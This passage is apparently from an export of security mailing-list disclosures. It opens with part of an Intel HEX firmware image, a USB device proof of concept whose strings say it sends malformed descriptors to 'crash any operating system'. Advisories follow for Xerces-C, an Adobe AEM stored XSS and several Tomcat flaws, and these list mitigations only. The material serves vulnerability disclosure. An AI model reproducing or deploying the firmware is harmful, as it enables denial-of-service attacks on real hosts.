:1005D000808184608083808182608083808181606B
:1005E0008083808180688083089590E0FC0131974A
:1005F000EE30F10590F5EA5AFF4F0C94A90980916D
:1006000080008F7703C0809180008F7D8093800071
:10061000089584B58F7702C084B58F7D84BD089519
:10062000809190008F7707C0809190008F7D03C0EC
:1006300080919000877F8093900008958091C00002
:100640008F7703C08091C0008F7D8093C000089594
:100650008091C200877F8093C2000895CF93DF937B
:1006600090E0FC01EA51FF4F2491FC01EC5FFE4F4A
:100670008491882349F190E0880F991FFC01E25C86
:10068000FE4FA591B491805D9E4FFC01C591D49120
:100690009FB7611108C0F8948C91209582238C93A8
:1006A000888182230AC0623051F4F8948C91322FF1
:1006B000309583238C938881822B888304C0F8949F
:1006C0008C91822B8C939FBFDF91CF9108950F93D4
:1006D0001F93CF93DF931F92CDB7DEB7282F30E063
:1006E000F901E853FF4F8491F901EA51FF4F14914A
:1006F000F901EC5FFE4F04910023C9F0882321F03B
:1007000069830E94F5026981E02FF0E0EE0FFF1F80
:10071000E05DFE4FA591B4919FB7F8948C91611163
:1007200003C01095812301C0812B8C939FBF0F9034
:10073000DF91CF911F910F910895CF93DF93282FD1
:1007400030E0F901E853FF4F8491F901EA51FF4F7E
:10075000D491F901EC5FFE4FC491CC2391F081114B
:100760000E94F502EC2FF0E0EE0FFF1FEE5DFE4F52
:10077000A591B4912C912D2381E090E021F480E0AB
:1007800002C080E090E0DF91CF910895615030F099
:100790002091F100FC0120830196F8CF289884E68F
:1007A00080937D0508951092E900109271051092D2
:1007B000700590936F0580936E050895FF920F93D7
:1007C0001F93CF93DF93F82E8B01EA01BA01C80182
:1007D0000E94A406F80120E030E08EEF2C173D07C0
:1007E00091F1F7FE02C0A49101C0A0816091700553
:1007F0007091710540916E0550916F0564177507F2
:10080000ACF49091E8009570E1F39091E80092FDCE
:100810001CC0A093F100A0917005B09171051196D4
:10082000AF73BB27AB2B11F48093E800A091700548
:10083000B09171051196B0937105A09370052F5F6B
:100840003F4F3196CBCFC90102C08FEF9FEFDF91B1
:10085000CF911F910F91FF9008951F920F920FB6A5
:100860000F9211246F927F928F929F92AF92BF92BC
:10087000CF92DF92EF92FF920F931F932F933F93AC
:100880004F935F936F937F938F939F93AF93BF9398
:10089000EF93FF93CF93DF93CDB7DEB76297DEBFC1
:1008A000CDBF1092E9008091E80083FF46C168E067
:1008B000CE010A960E94C60382EF8093E8009A85D3
:1008C00097FF05C08091E80080FFFCCF03C08EEF4A
:1008D0008093E800892F807609F023C18B858111F0
:1008E00005C01092F1001092F10020C1282F2D7F39
:1008F000213009F41BC1853049F48091E80080FF64
:10090000FCCF8C8580688093E30010C1863009F0AD
:10091000E1C02D8508891989223009F0B3C0EC8423
:100920008E2D90E020917305309174058217930706
:100930000CF09FC00E94D3031F92EF928DE394E0CE
:100940009F938F930E9481068CE0E89E7001112492
:10095000E0917505F0917605EE0DFF1D89E0DE0151
:10096000119601900D928A95E1F7C8010E94D30378
:1009700049E050E0BE016F5F7F4F80E00E94DE03E0
:100980000F900F900F900F90C12CD12C612C712CD7
:1009900033E7A32E34E0B32E4AEA842E44E0942EAB
:1009A000E0917505F0917605EE0DFF1D818590E0D3
:1009B000681679060CF0BAC07F926F92BF92AF9220
:1009C0000E948106E0917505F0917605EE0DFF1D00
:1009D000628573856C0D7D1D49E050E080E00E94CA
:1009E000DE030F900F900F900F9000E010E0E09169
:1009F0007505F0917605EE0DFF1D0284F385E02D5F
:100A0000EC0DFD1D818590E0081719075CF51F931B
:100A10000F939F928F920E948106E0917505F0914D
:100A20007605EE0DFF1D0284F385E02DEC0DFD1D16
:100A3000C801880F991FA485B585A80FB91F4D91CE
:100A40005C910284F385E02DE80FF91F60817181CC
:100A500080E00E94DE030F5F1F4F0F900F900F90FA
:100A60000F90C5CF8FEF681A780A8EE0C80ED11CA0
:100A700097CF8FED94E09F938F930E9481060F9004
:100A80000F9058C0C8012A8B0E94D3032A892130B5
:100A9000C1F0233009F04EC08C851F928F9389EFEF
:100AA00094E09F938F930E94810642E050E062E8B9
:100AB00071E080E00E94DE030F900F900F900F9086
:100AC00035C04091000150E060E071E080E00E949C
:100AD000DE032CC0873071F1883021F481E08093EF
:100AE000F10024C0893011F5937021F5EDE4F1E0B7
:100AF00081E021E096E38093E9002093EB003491BC
:100B00003093EC009093ED008F5F3196843099F72D
:100B10008EE78093EA001092EA008C85809372053C
:100B200005C0888999890E94D30304C08EEF809301
:100B3000E80003C081E28093EB0062960FB6F89460
:100B4000DEBF0FBECDBFDF91CF91FF91EF91BF917F
:100B5000AF919F918F917F916F915F914F913F9155
:100B60002F911F910F91FF90EF90DF90CF90BF904A
:100B7000AF909F908F907F906F900F900FBE0F90CF
:100B80001F9018951F920F920FB60F9211248F93FA
:100B90009F938091E1001092E10083FF0FC01092BB
:100BA000E90091E09093EB001092EC0092E39093B7
:100BB000ED001092720598E09093F00082FF1AC049
:100BC00080917E05882339F080917E058150809345
:100BD0007E05882369F080917D05882359F08091F6
:100BE0007D05815080937D05811104C0289A02C043
:100BF0005D9AF1CF9F918F910F900FBE0F901F9034
:100C00001895CF93DF93CDB7DEB782E1FE0135961D
:100C1000A0E0B1E001900D928A95E1F78F89988D5F
:100C20009093760580937505898D9A8D90937405C0
:100C3000809373058B8D9C8D90937C0580937B05B1
:100C40008D8D9E8D90937A05809379058F8D98A1D7
:100C500090937805809377051092720581E08093D8
:100C6000D70080EA8093D80082E189BD09B400FEF4
:100C7000FDCF61E070E080E090E00E94790280E9C1
:100C80008093D8008CE08093E2001092E000559AA7
:100C9000209ADF91CF91089581E08093E00008953C
:100CA0009091C80095FFFCCF8093CE0008951092DC
:100CB000CD0087E68093CC0088E18093C9008EE068
:100CC0008093CA0008950F931F93CF93DF93EC0195
:100CD0008C01FE0101900020E9F73197EC1BFD0B20
:100CE000C8018C1B9D0B8E179F0730F4F801819172
:100CF0008F010E945006EDCFDF91CF911F910F9190
:100D00000895CF93DF93CDB7DEB7DA950FB6F89499
:100D1000DEBF0FBECDBFFE01EB5FFE4F4191519193
:100D20009F0160E071E0CE0101960E940507CE01AF
:100D300001960E946306D3950FB6F894DEBF0FBEEE
:100D4000CDBFDF91CF9108958F929F92AF92BF92C6
:100D5000CF92DF92EF92FF920F931F93CF93DF9387
:100D600000D0CDB7DEB75B0122E535E03F932F938E
:100D700089839A830E9481068981882E9A81992E7F
:100D80000F900F9000E010E08EE5E82E85E0F82E41
:100D900091E1C92E94E0D92E0A151B05E4F4F40163
:100DA00081914F0190E09F938F93FF92EF920E9469
:100DB00081060F5F1F4FC8018F7099270F900F900A
:100DC0000F900F90892B41F7DF92CF920E948106FE
:100DD0000F900F90E1CF81E194E09F938F930E9459
:100DE00081060F900F900F900F90DF91CF911F9180
:100DF0000F91FF90EF90DF90CF90BF90AF909F90BA
:100E00008F900895F8940C94E609AEE0B0E0EBE022
:100E1000F7E00C94BD098C01CA0146E04C831A83AB
:100E2000098377FF02C060E070E8615071097E833A
:100E30006D83A901BC01CE0101960E9431074D814D
:100E40005E8157FD0AC02F813885421753070CF485
:100E50009A01F801E20FF31F10822E96E4E00C9441
:100E6000D909ACE0B0E0E7E3F7E00C94AF097C010E
:100E70006B018A01FC0117821682838181FFBDC14B
:100E8000CE0101964C01F7019381F60193FD859106
:100E900093FF81916F01882309F4ABC1853239F446
:100EA00093FD859193FF81916F01853229F4B701FC
:100EB00090E00E941909E7CF512C312C20E020321C
:100EC000A0F48B3269F030F4803259F0833269F447
:100ED00020612CC08D3239F0803339F4216026C076
:100EE0002260246023C0286021C027FD27C030ED88
:100EF000380F3A3078F426FF06C0FAE05F9E300DD6
:100F00001124532E13C08AE0389E300D1124332E45
:100F100020620CC08E3221F426FD6BC1206406C015
:100F20008C3611F4206802C0883641F4F60193FD36
:100F3000859193FF81916F018111C1CF982F9F7D82
:100F40009554933028F40C5F1F4FFFE3F9830DC0D5
:100F5000833631F0833771F0833509F05BC022C0EE
:100F6000F801808189830E5F1F4F44244394512CE4
:100F7000540115C03801F2E06F0E711CF801A08019
:100F8000B18026FF03C0652D70E002C06FEF7FEFD8
:100F9000C5012C870E940E092C0183012C852F7717
:100FA000222E17C03801F2E06F0E711CF801A080EC
:100FB000B18026FF03C0652D70E002C06FEF7FEFA8
:100FC000C5012C870E9403092C012C852068222E44
:100FD000830123FC1BC0832D90E048165906B0F412
:100FE000B70180E290E00E9419093A94F4CFF5012C
:100FF00027FC859127FE81915F01B70190E00E9457
:10100000190931103A94F1E04F1A51084114510472
:1010100071F7E5C0843611F0893639F5F80127FFFC
:1010200007C060817181828193810C5F1F4F08C06E
:1010300060817181882777FD8095982F0E5F1F4F03
:101040002F76B22E97FF09C0909580957095619587
:101050007F4F8F4F9F4F2068B22E2AE030E0A401CF
:101060000E944B09A82EA81844C0853729F42F7E6A
:10107000B22E2AE030E025C0F22FF97FBF2E8F3646
:10108000C1F018F4883579F0B4C0803719F088378A
:1010900021F0AFC02F2F2061B22EB4FE0DC08B2DDA
:1010A0008460B82E09C024FF0AC09F2F9660B92E15
:1010B00006C028E030E005C020E130E002C020E1B9
:1010C00032E0F801B7FE07C06081718182819381AF
:1010D0000C5F1F4F06C06081718180E090E00E5F61
:1010E0001F4FA4010E944B09A82EA818FB2DFF77C3
:1010F000BF2EB6FE0BC02B2D2E7FA51450F4B4FED0
:101100000AC0B2FC08C02B2D2E7E05C07A2C2B2DD8
:1011100003C07A2C01C0752C24FF0DC0FE01EA0D1E
:10112000F11D8081803311F4297E09C022FF06C0A1
:101130007394739404C0822F867809F0739423FD0E
:1011400013C020FF06C05A2C731418F4530C571800
:10115000732C731468F4B70180E290E02C870E942E
:10116000190973942C85F5CF731410F4371801C046
:10117000312C24FF12C0B70180E390E02C870E943D
:1011800019092C8522FF17C021FF03C088E590E0D4
:1011900002C088E790E0B7010CC0822F867859F032
:1011A00021FD02C080E201C08BE227FD8DE2B70184
:1011B00090E00E941909A51438F4B70180E390E08B
:1011C0000E9419095A94F7CFAA94F401EA0DF11D6F
:1011D0008081B70190E00E941909A110F5CF33205A
:1011E00009F451CEB70180E290E00E9419093A94C7
:1011F000F6CFF7018681978102C08FEF9FEF2C9683
:10120000E2E10C94CB09FC010590615070400110A3
:10121000D8F7809590958E0F9F1F0895FC0161501F
:10122000704001900110D8F7809590958E0F9F1F08
:1012300008950F931F93CF93DF93182F092FEB017E
:101240008B8181FD03C08FEF9FEF20C082FF10C014
:101250004E815F812C813D81421753077CF4E881E8
:10126000F9819F012F5F3F4F39832883108306C088
:10127000E885F985812F0995892B29F72E813F81F2
:101280002F5F3F4F3F832E83812F902FDF91CF9190
:101290001F910F910895FA01AA27283051F12031AA
:1012A00081F1E8946F936E7F6E5F7F4F8F4F9F4FFA
:1012B000AF4FB1E03ED0B4E03CD0670F781F891F3C
:1012C0009A1FA11D680F791F8A1F911DA11D6A0F0A
:1012D000711D811D911DA11D20D009F468943F91BD
:1012E0002AE0269F11243019305D3193DEF6CF01BC
:1012F0000895462F4770405D4193B3E00FD0C9F782
:10130000F6CF462F4F70405D4A3318F0495D31FDEE
:101310004052419302D0A9F7EACFB4E0A695979541
:10132000879577956795BA95C9F700976105710517
:1013300008959B01AC010A2E069457954795379561
:101340002795BA95C9F7620F731F841F951FA01DBB
:101350000895EE0FFF1F0590F491E02D09942F9250
:101360003F924F925F926F927F928F929F92AF9235
:10137000BF92CF92DF92EF92FF920F931F93CF9382
:10138000DF93CDB7DEB7CA1BDB0B0FB6F894DEBF19
:101390000FBECDBF09942A88398848885F846E843F
:1013A0007D848C849B84AA84B984C884DF80EE8089
:1013B000FD800C811B81AA81B981CE0FD11D0FB692
:1013C000F894DEBF0FBECDBFED010895F894FFCFB6
:1013D0001201000200000040AD0BEFBE000101024F
:1013E000000122034200610064002000420041002D
:1013F00042004500250078002500780025006E0099
:101400002500700018034200410044002000430002
:101410003000460046004500450021001201000250
:1014200000000040580403500001010203010902BA
:10143000270001010000FA0705810304040C0705D9
:10144000010204000C0705820104000C07000700DC
:101450000700480100500072006F006C00690066D0
:101460000069006300000A550000006BFD180A00C7
:10147000809F0AB901312B940A8101128946001319
:10148000000257028B0A5E0AF80A5F01F21201009D
:1014900002010000400D055702000101020301B9DD
:1014A0000A0100F80A5F0A810A220342006100640F
:1014B0000020004200410042004500250078002540
:1014C00000780025006E00250070001803420041DE
:1014D000004400200043003000460046004500451F
:1014E00000210012010002010000400D055702001A
:1014F000010102030109040000030100000003F2DE
:101500000AEC0A0902270001010000FA01AB0A09EE
:101510000400000301000000090200202020202018
:101520005F5F5F5F5F5F5F5F2020202020202020C3
:1015300020202020202020202020202020202020AB
:1015400020205F5F5F5F5F205F5F20205F202020A3
:101550002020205F5F0A0D00202020202F205F5FC9
:101560005F5F2F202F5F20205F5F5F5F205F5F5FE7
:101570005F5F20205F5F5F5F5F20202020202F20A3
:101580005F5F5F2F2F202F5F285F295F5F5F5F2FD7
:10159000202F5F5F0A0D002020202F202F202020E9
:1015A0002F205F5F205C2F205F5F20602F205F5F18
:1015B000205C2F205F5F5F2F5F5F5F5F205C5F5F5E
:1015C000205C2F205F5F2F202F205F5F5F2F202F59
:1015D0002F5F2F0A0D0020202F202F5F5F5F2F200D
:1015E0002F202F202F202F5F2F202F202F5F2F2005
:1015F000285F5F2020292F5F5F5F2F205F5F2F20F4
:101600002F202F5F2F202F202F5F5F2F202C3C0AB1
:101610000D0020205C5F5F5F5F2F5F2F202F5F2F0B
:101620005C5F5F2C5F2F5C5F5F5F5F2F5F5F5F5F63
:101630002F20202020202F5F5F5F5F2F5C5F5F2FB8
:101640005F2F5C5F5F5F2F5F2F7C5F7C0A0D002048
:101650003C3C2043485241534820414E59204F5072
:1016600045524154494E472053595354454D203E0D
:101670003E0A0D00203C3C202863292053657267F8
:10168000656A20536368756D696C6F20323031353F
:101690002C204F70656E536F7572636520536563C0
:1016A00075726974792052616C66205370656E6E34
:1016B0006562657267203E3E0A0D000A3E3E20507C
:1016C0007265737320627574746F6E20746F20730B
:1016D0007461727420657865637574696F6E2E2EFF
:1016E0002E0A0D005B44454255475D2045786563F1
:1016F000757465207061796C6F616420300A0D002B
:10170000526563762D446174613A0A0D005B44456D
:101710004255475D200953656E6420436F6E6669CC
:101720006775726174696F6E446573637269707412
:101730006F720928696E6465783A2569292E2E2E04
:101740000D0A005B44454255475D200953656E64B0
:1017500020496E74657266616365204465736372C7
:101760006970746F720928696E7465726661636569
:101770003A2569292E2E2E0D0A005B444542554715
:101780005D200953656E6420456E64706F696E74E8
:101790002044657363726970746F720928656E64A2
:1017A000706F696E743A2569292E2E2E0D0A005B22
:1017B00044454255475D203C3C70616E6963206D35
:1017C0006F64653F3E3E0D0A005B44454255475DF0
:1017D0002009203E3E20537472696E672044657371
:1017E00063726970746F72207265717565737420AD
:1017F0002D2073656E64696E67206D616C666F7213
:101800006D656420737472696E67212073657475E9
:10181000702E7756616C75654C203D3D2025690D15
:101820000A005B48455844554D505D0A0D0025306F
:04183000325820000A
:00000001FF
--
OpenSource Security Ralf Spenneberg http://www.os-s.de
Am Bahnhof 3-5 48565 Steinfurt Germany
Fon: +49(0)2552 638 755 Fax: +49(0)2552 638 757"
3399,RE: CVE-2016-0729: Apache Xerces-C XML Parser Crashes on Malformed Input,,CVE-2016-0729,"Hi,
Could you please let me know how to reproduce the issue, we are using xerces-c in one our product.
Ahead Together,
Shivaprasad BS
E mail: Official shivaprasad.s trianz com
Mobile: +91 9900633664
www.trianz.com l LinkedIn | Facebook | Twitter space  leave
Note: This message (including any attachments) contains business proprietary/confidential information intended for a specific individual and purpose, and is protected by law.  If you are not the intended recipient, you should delete this message.  Any disclosure, copying, or distribution of this message, or the taking of any action based on it, without the express permission of the originator, is strictly prohibited.  If you believe that you have received this email in error, please contact the sender immediately and delete the email and all of its attachments.
Trianz Email Privacy and Confidential Policy
-----Original Message-----
From: Cantor, Scott [mailto:cantor.2 osu edu]
Sent: Thursday, February 25, 2016 7:51 PM
To: c-dev xerces apache org; c-users xerces apache org; security apache org; oss-security lists openwall com; bugtraq securityfocus com
Cc: Gustavo Grieco
Subject: CVE-2016-0729: Apache Xerces-C XML Parser Crashes on Malformed Input
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256
CVE-2016-0729: Apache Xerces-C XML Parser Crashes on Malformed Input
Severity: Critical
Vendor: The Apache Software Foundation
Versions Affected: Apache Xerces-C XML Parser library versions prior to V3.1.3
Description: The Xerces-C XML parser mishandles certain kinds of malformed input documents, resulting in buffer overlows during processing and error reporting. The overflows can manifest as a segmentation fault or as memory corruption during a parse operation. The bugs allow for a denial of service attack in many applications by an unauthenticated attacker, and could conceivably result in remote code execution.
Mitigation: Applications that are using library versions older than
V3.1.3 should upgrade as soon as possible. Distributors of older versions should apply the patches from this subversion revision:
http://svn.apache.org/viewvc?view=revision&revision=1727978
Credit: This issue was reported by Gustavo Grieco.
References:
http://xerces.apache.org/xerces-c/secadv/CVE-2016-0729.txt
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v2
iQIcBAEBCAAGBQJWzlsyAAoJEDeLhFQCJ3liUAsP/Rr4rBKVPxOw3+5JDiQWT27y
/TT1kLFV+u6LtuBL3q6rwOIANquEMP1nJPVuYtceNF66xHi7eX6HZ8jZch6T+uvZ
Bt+kUTOfG4PW1RLm83W1kof58PTI5mIYBWofAQzXm9TSyvoHF5GXWqzNyGOKauYN
pto5xvJzEN5gM7DjbXF8OoIesNVaqCnr+9A2WmCCdNGNzSQLlUVDg9kDvXUdDvHD
+TXHDfgP8OSEYl5e3B3P5OV6SzUi2xdATR6zQgb1QANJy7FoK/FOP5+2J8ccultu
mXlVHpsGlPoIi85nyKVykK3hTT4DyhqSwCa9ek3D5i7lIEk2dXxeevh90is3y/Al
0GSUoG7yXbfe7xmlcUUghdYeYBP6JSOiOqAREUsKfY6nYo4XpGwvJRz/Xgk7iw9y
p39sCIKuJBpqe1Vgy8ONeTFc0WZkkriq23n2oZ4zxoOImF5k44f01olZhA/wmE1P
Wi6Qrafn6myUtp1TAXWoakfxJo0DgHfH6fazlmYSPHIyfLShrAcG6aETDn92KsDp
gy4a5ulP/qpkncJrF2+XeM1wgQSTpUln2664fSwRw5whqg/PW/qGx+/1sltwOSQe
l4bvQhr9xvkv+W++aPFgmJF3HW0Gnsglty6KQAcQ/RqheZ+/vL9buCqWw2xg4bkN
BQJ4QvN4uaHIUxhzVfiL
=vI5o
-----END PGP SIGNATURE-----"
3405,CVE-2016-0729: Apache Xerces-C XML Parser Crashes on Malformed Input,,CVE-2016-0729,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256
CVE-2016-0729: Apache Xerces-C XML Parser Crashes on Malformed Input
Severity: Critical
Vendor: The Apache Software Foundation
Versions Affected: Apache Xerces-C XML Parser library versions
prior to V3.1.3
Description: The Xerces-C XML parser mishandles certain kinds of malformed
input documents, resulting in buffer overlows during processing and error
reporting. The overflows can manifest as a segmentation fault or as memory
corruption during a parse operation. The bugs allow for a denial of service
attack in many applications by an unauthenticated attacker, and could
conceivably result in remote code execution.
Mitigation: Applications that are using library versions older than
V3.1.3 should upgrade as soon as possible. Distributors of older versions
should apply the patches from this subversion revision:
http://svn.apache.org/viewvc?view=revision&revision=1727978
Credit: This issue was reported by Gustavo Grieco.
References:
http://xerces.apache.org/xerces-c/secadv/CVE-2016-0729.txt
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v2
iQIcBAEBCAAGBQJWzlsyAAoJEDeLhFQCJ3liUAsP/Rr4rBKVPxOw3+5JDiQWT27y
/TT1kLFV+u6LtuBL3q6rwOIANquEMP1nJPVuYtceNF66xHi7eX6HZ8jZch6T+uvZ
Bt+kUTOfG4PW1RLm83W1kof58PTI5mIYBWofAQzXm9TSyvoHF5GXWqzNyGOKauYN
pto5xvJzEN5gM7DjbXF8OoIesNVaqCnr+9A2WmCCdNGNzSQLlUVDg9kDvXUdDvHD
+TXHDfgP8OSEYl5e3B3P5OV6SzUi2xdATR6zQgb1QANJy7FoK/FOP5+2J8ccultu
mXlVHpsGlPoIi85nyKVykK3hTT4DyhqSwCa9ek3D5i7lIEk2dXxeevh90is3y/Al
0GSUoG7yXbfe7xmlcUUghdYeYBP6JSOiOqAREUsKfY6nYo4XpGwvJRz/Xgk7iw9y
p39sCIKuJBpqe1Vgy8ONeTFc0WZkkriq23n2oZ4zxoOImF5k44f01olZhA/wmE1P
Wi6Qrafn6myUtp1TAXWoakfxJo0DgHfH6fazlmYSPHIyfLShrAcG6aETDn92KsDp
gy4a5ulP/qpkncJrF2+XeM1wgQSTpUln2664fSwRw5whqg/PW/qGx+/1sltwOSQe
l4bvQhr9xvkv+W++aPFgmJF3HW0Gnsglty6KQAcQ/RqheZ+/vL9buCqWw2xg4bkN
BQJ4QvN4uaHIUxhzVfiL
=vI5o
-----END PGP SIGNATURE-----"
3428,CVE-2015-0955 - Stored XSS in Adobe Experience Manager (AEM),,CVE-2015-0955,"#############################################################
#
# COMPASS SECURITY ADVISORY http://www.csnc.ch/
#############################################################
#
# CSNC ID: CSNC-2015-011
# CVE ID : CVE-2015-0955
# Product: Adobe Experience Manager (AEM) [1]
# Vendor: Adobe [2]
# Subject: Stored Cross-Site Scripting (XSS) Vulnerability
# Risk: Important
# Effect: Exploitable by Authenticated AEM Users
# Author: Damian Pfammatter (damian.pfammatter csnc ch)
# Date: February 23rd 2016
#
#############################################################
Introduction:
-------------
Adobe Experience Manager (AEM) is an enterprise-grade web content management
solution for building
websites, mobile apps and forms [1].
Security Analysts of Compass Security Schweiz AG [3] discovered a stored
Cross-Site Scripting (XSS)
vulnerability, which allows executing JavaScript code in a victim's context,
potentially resulting
in a number of different attack scenarios. For instance, the identified
vulnerability could be used
by a malicious AEM user to publish content in the name of another AEM user.
Affected Versions:
------------------
AEM 6.1.0
Technical Description:
----------------------
Authenticated users in AEM, having permissions to create new folders, may
place malicious JavaScript
code into a folder's title field. Once such a folder gets deleted, the
injected code is executed in
the context of the user deleting the folder. The vulnerability arises due to
improper output
encoding of folder titles in the Deletion popup dialog.
Amongst others, this stored XSS vulnerability could potentially be leveraged
by a low-privileged AEM
user to escalate its privileges. For example, a user having content
management permissions only
could create a folder, which when deleted by another, higher privileged AEM
user, could assign him
administrative privileges. Other type of XSS-related attacks - such as for
instance redirecting
other AEM users to websites abusing browser vulnerabilities to gain local
access - might be
possible.
Hotfix:
-------
Adobe has released a security hotfix (8651) [4] to address this issue.
Timeline:
---------
2015-10-29: Vulnerability discovered
2015-11-23: Initial vendor notification
2015-12-01: Vendor confirmed security issue
2016-02-09: Vendor released security fix & guidance to its customers [4]
2016-02-23: Public disclosure
References:
-----------
[1]:
https://www.adobe.com/marketing-cloud/enterprise-content-management.html
[2]: https://www.adobe.com
[3]: http://www.csnc.ch/advisories
[4]:
https://helpx.adobe.com/security/products/experience-manager/apsb16-05.html"
3433,[SECURITY] CVE-2016-0763 Apache Tomcat Security Manager Bypass,,CVE-2016-0763,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256
CVE-2016-0763 Apache Tomcat Security Manager Bypass
Severity: Moderate
Vendor: The Apache Software Foundation
Versions Affected:
- - Apache Tomcat 7.0.0 to 7.0.67
- - Apache Tomcat 8.0.0.RC1 to 8.0.30
- - Apache Tomcat 9.0.0.M1 to 9.0.0.M2
Description:
ResourceLinkFactory.setGlobalContext() is a public method and was
accessible by web applications running under a security manager
without any checks. This allowed a malicious web application to inject
a malicious global context that could in turn be used to disrupt other
web applications and/or read and write data owned by other web
applications.
Mitigation:
Users of affected versions should apply one of the following mitigations
- - Upgrade to Apache Tomcat 9.0.0.M3 or later
- - Upgrade to Apache Tomcat 8.0.32 or later
(8.0.31 has the fix but was not released)
- - Upgrade to Apache Tomcat 7.0.68 or later
- - Upgrade to Apache Tomcat 6.0.45 or later
Credit:
This issue was discovered by The Apache Tomcat Security Team.
References:
[1] http://tomcat.apache.org/security-9.html
[2] http://tomcat.apache.org/security-8.html
[3] http://tomcat.apache.org/security-7.html
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v2
iQIcBAEBCAAGBQJWyu+yAAoJEBDAHFovYFnnPIgP/j9nli2IrsZEyhDyJ6XqAcg9
AisYAv7iSQ63zLe27CERDdOS9BBFI9j+MwkabF0FzmTGxugLyRwpKLt8Y3BV/723
Jwgds8phJcOm5oouzblUBfx/HdFDRI8+J6q7CNoSh61yXatuKRe5upc51W9G8/Vd
YS6b5XNqavBgvkQZudITIsr4N9vqxb+QVS9iMJfrACikgeq6QR6rwkJWAEcUYHrn
RESKuCTPzw8yf1Q1C8Ar9BUdSx8MRFDHfV8stKmjQWslud0EOP5bObWXBsv9vrQ7
XNKVKA69Hp1Kk++ORHUPnv6B2bCRsD5mZmBwqcvi6jVMuVMKaiLgCqJqfXcJEb4+
D86kjsBCQchGWSsFEwzmoQI++wW60Mn5QRlibF90LHAJLfZLo+cCsOUZABqgv3+j
xwA6HpR5ToMepO5CNcL76wDoBJDEPRXjIuVY6RhWnS7UXi4kuqp/qxtWBifn07X/
Ncbm5TWhf4ESnS5YOPMNefA5aDQJKRclymyXB37VxMwHdJ/zkY8uV48SeG9ACHNt
KBaXiS7FiNKLWqbzZijsXM2a40benXn6ocxStyApF7h15k/8/pyyq4DC55TBMitK
/L+RHHp9RAS+wP98xyYpFnuVI8/LkHSJwnLvTURDQlr1Fi/AJ5YIB+Y9GPE2sigA
90lXXPnmrbSsQR10jD/j
=5LII
-----END PGP SIGNATURE-----"
3434,[SECURITY] CVE-2015-5345 Apache Tomcat Directory disclosure,,CVE-2015-5345,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256
CVE-2015-5345 Apache Tomcat Directory disclosure
Severity: Low
Vendor: The Apache Software Foundation
Versions Affected:
- - Apache Tomcat 6.0.0 to 6.0.44
- - Apache Tomcat 7.0.0 to 7.0.66
- - Apache Tomcat 8.0.0.RC1 to 8.0.29
- - Apache Tomcat 9.0.0.M1
- - Earlier, unsupported Tomcat versions may be affected
Description:
When accessing a directory protected by a security constraint with a URL
that did not end in a slash, Tomcat would redirect to the URL with the
trailing slash thereby confirming the presence of the directory before
processing the security constraint. It was therefore possible for a user
to determine if a directory existed or not, even if the user was not
permitted to view the directory. The issue also occurred at the root of
a web application in which case the presence of the web application was
confirmed, even if a user did not have access.
The solution was to implement the redirect in the DefaultServlet so that
any security constraints and/or security enforcing Filters were
processed before the redirect. The Tomcat team recognised that moving
the redirect could cause regressions to two new Context configuration
options (mapperContextRootRedirectEnabled and
mapperDirectoryRedirectEnabled) were introduced. The initial default was
false for both since this was more secure. However, due to regressions
such as Bug 58765 [1] the default for mapperContextRootRedirectEnabled
was later changed to true since it was viewed that the regression was
more serious than the security risk of associated with being able to
determine if a web application was deployed at a given path.
Mitigation:
Users of affected versions should apply one of the following mitigations
- - Upgrade to Apache Tomcat 9.0.0.M3 or later
(9.0.0.M2 has the fix but was not released)
- - Upgrade to Apache Tomcat 8.0.30 or later
- - Upgrade to Apache Tomcat 7.0.67 or later
- - Upgrade to Apache Tomcat 6.0.45 or later
Credit:
This issue was discovered by Mark Koek of QCSec.
References:
[1] https://bz.apache.org/bugzilla/show_bug.cgi?id=58765
[2] http://tomcat.apache.org/security-9.html
[3] http://tomcat.apache.org/security-8.html
[4] http://tomcat.apache.org/security-7.html
[5] http://tomcat.apache.org/security-6.html
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v2
iQIcBAEBCAAGBQJWyu+lAAoJEBDAHFovYFnnFrYP+wZwqPsP6vtAn4VrIslTxrkO
A31WCsXwnvggSIBLdITCwpJFywqPfpurFhce38Chgznli9E46Pr6dukTC56NhjmB
Cv7+PTdpJxM3vKFw+OlLrfIrxEFtHbYOTI6q7NgjfVjdbG9LbVgG3JRTmf3tT+GN
DU165VK7TxvBj68ll05gLECgAtrGFAEQl+51VlfWRZw8wXGFni2X43kEwUpihgHj
Ci4W1+sBUln0ww+aKa6sRpJTi/s3tKPWckjMY//bDIMfd4gdK7N6CJSrRMbj6Gsw
gfm1ixWlJJPKVvokH08NKvxcpwvRX4D1RD80WkaCrC7WMKzK8ohmhxxhIDXHmPE8
kibaJuy1WqQG+G/H00LTGpGkeevyg4/mH2hDxDbDJ5ye1RMA9GsKFC1YpDzugTxO
zr9lX9QRWpPNEJDXSipdjs27p8hcF+vgwI5eVd5R721wpv17IEg0Lsy4zvvswFik
t3rIj6wwVYHFoMNpwA/sojaRTGb62nqGREYiGMX4fPPd2OCtl1J4I8oZ3x4Q2gkJ
WRX98z6a04zMisiGNeTjl7ZkgEjNNW8/XG4J5sFmgSo5p2XwBCINLyWfnYiQporj
Ym0Ig9k8t5BHntgkP02a+CF9GScdkxNq8UC8Ad2oAHBqOEXd/9DHv80fA7ApvG7e
HnSzWGDdd63z0ixY0g2I
=6UrH
-----END PGP SIGNATURE-----"
3435,[SECURITY] CVE-2015-5346 Apache Tomcat Session fixation,,CVE-2015-5346,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256
CVE-2015-5346 Apache Tomcat Session fixation
Severity: Low
Vendor: The Apache Software Foundation
Versions Affected:
- - Apache Tomcat 7.0.5 to 7.0.65
- - Apache Tomcat 8.0.0.RC1 to 8.0.30
- - Apache Tomcat 9.0.0.M1
Description:
When recycling the Request object to use for a new request, the
requestedSessionSSL field was not recycled. This meant that a session ID
provided in the next request to be processed using the recycled Request
object could be used when it should not have been. This gave the client
the ability to control the session ID. In theory, this could have been
used as part of a session fixation attack but it would have been hard to
achieve as the attacker would not have been able to force the victim to
use the 'correct' Request object. It was also necessary for at least one
web application to be configured to use the SSL session ID as the HTTP
session ID. This is not a common configuration.
Mitigation:
Users of affected versions should apply one of the following mitigations
- - Upgrade to Apache Tomcat 9.0.0.M3 or later
